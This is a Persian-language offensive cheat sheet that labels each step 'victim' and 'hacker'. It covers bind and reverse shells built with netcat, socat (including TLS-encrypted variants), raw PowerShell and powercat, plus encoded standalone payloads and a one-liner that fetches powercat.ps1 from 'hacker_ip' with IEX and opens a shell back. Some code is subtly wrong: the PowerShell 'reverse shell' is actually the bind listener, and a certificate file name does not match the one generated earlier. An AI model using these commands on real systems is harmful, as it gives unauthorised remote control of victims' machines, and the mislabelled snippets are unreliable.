ابزار های کاربردی

netcat​

بررسی باز بودن پورت بر روی سیستم مقصد​

netcat -n -v ip port

علاوه بر بررسی باز بودن پورت می توان با سرویس قرار گرفته بر روی پورت هم ارتباط برقرار کرد

گوش دادن به یک پورت​

netcat -nvlp port

انتقال فایل​

سیستم مقصد

netcat -nlvp port > file

سیستم مبدا

netcat -nv dst_ip port < file

مدیریت از راه دور یک سیستم​

روش Bind Shell​

Source-------------------->Destination

سیستم مقصد(قربانی)

netcat -nlvp port -e cmd.exe

سیستم مقصد یک سیستم ویندوزی است و کلیه دستورات که از سمت مبدا ارسال می شود در cmd اجرا می شود

سیستم مبدا(هکر)

netcat -nv dst_ip port

روش Reverse Shell​

Source<--------------------Destination

سیستم مبدا(هکر)

netcat -nlvp port

سیستم مقصد(قربانی)

netcat -nv dst_ip port -e /bin/bash

سیستم مقصد یک سیستم لینوکسی است و کلیه دستورات که از سمت مبدا ارسال می شود در bash اجرا می شود

از جایگزین های netcat می توان به ncat هم اشاره کرد

socat​

بررسی باز بودن پورت بر روی سیستم مقصد​

socat - TCP4:dst_ip:port

علاوه بر بررسی باز بودن پورت می توان با سرویس قرار گرفته بر روی پورت هم ارتباط برقرار کرد

گوش دادن به یک پورت​

socat TCP4-LISTEN:444 STDOUT

انتقال فایل​

سیستم مقصد

socat TCP4:source_ip:port file:file_received.txt,create

سیستم مبدا

socat TCP4-LISTEN:443,fork file:file.txt

مدیریت از راه دور یک سیستم​

روش Bind Shell​

Source-------------------->Destination

سیستم مقصد(قربانی)

socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes

سیستم مبدا(هکر)

socat - TCP4:dst_ip:4443

روش Reverse Shell​

Source<--------------------Destination

سیستم مبدا(هکر)

socat -d -d TCP4-LISTEN:443 STDOUT

سیستم مقصد(قربانی)

socat TCP4:dst_ip:443 EXEC:/bin/bash
socat TCP4:dst_ip:443 EXEC:'cmd.exe',pipes

سیستم مقصد یک سیستم لینوکسی است و کلیه دستورات که از سمت مبدا ارسال می شود در bash اجرا می شود

روش Encrypted Bind Shell​

در این روش برای مخفی نگه داشتن اطلاعات بین مبدا و مقصد از Certificate استفاده می شود

برای تولید Certificate

openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 333 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem

سیستم مقصد(قربانی)

socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:'cmd.exe',pipes

سیستم مبدا(هکر)

socat - OPENSSL:dst_ip:443,verify=0

روش Encrypted Reverse Shell​

در این روش برای مخفی نگه داشتن اطلاعات بین مبدا و مقصد از Certificate استفاده می شود

برای تولید Certificate

openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 333 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem

سیستم مقصد(قربانی)

socat OPENSSL:dst_ip:4443,verify=0 EXEC:/bin/bash
socat OPENSSL:dst_ip:4443,verify=0 EXEC:'cmd.exe',pipes

سیستم مبدا(هکر)

socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT

لینک کمکی

https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/

powercat​

برای اجرای اسکریپت های untrusted

Set-ExecutionPolicy Unrestricted

دانلود فایل

 powershell -c "(new-object System.Net.WebClient).DownloadFile('https://dst_ip/file.exe','c:\file.exe')"

دستور بالا در cmd اجرا شود

مدیریت از راه دور یک سیستم​

روش Bind Shell​

Source-------------------->Destination

سیستم مقصد(قربانی)

powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

دستور بالا در cmd اجرا شود

سیستم مبدا(هکر)

netcat -nv dst_ip 443

روش Reverse Shell​

Source<--------------------Destination

سیستم مبدا(هکر)

netcat -nlvp 443

سیستم مقصد(قربانی)

powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

دستور بالا در cmd اجرا شود

powercat​

مدیریت از راه دور یک سیستم​

روش Bind Shell​

Source-------------------->Destination

سیستم مقصد(قربانی)

powercat -l -p 443 -e cmd.exe

سیستم مبدا(هکر)

netcat -nv dst_ip 443

روش Reverse Shell​

Source<--------------------Destination

سیستم مبدا(هکر)

netcat -nlvp 443

سیستم مقصد(قربانی)

powercat -c <dst_ip> -p 443 -e cmd.exe

روش standalone

powercat -c dst_ip -p 443 -e cmd.exe -g > revershell.ps1
.\revershell.ps1

روش standalone encoded

powercat -c dst_ip -p 443 -e cmd.exe -ge > revershell.ps1
.\revershell.ps1

اجرا دستور کد شده

powershell -E encoded_command

در صورتی که در سیستم مقصد powercat موجود نباشد

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://hacker_ip/powercat.ps1');powercat -c hacker_ip -p 443 -e cmd"

دستور بالا در cmd اجرا شود

اجرای وب سرور در پایتون

python2 -m SimpleHTTPServer 80
python3 -m http.server 9000

لینک کمکی

https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/

انتقال فایل​

سیستم مقصد

netcat -nlvp port > file.exe

سیستم مبدا

powercat -c dst_ip -p port -i file.exe
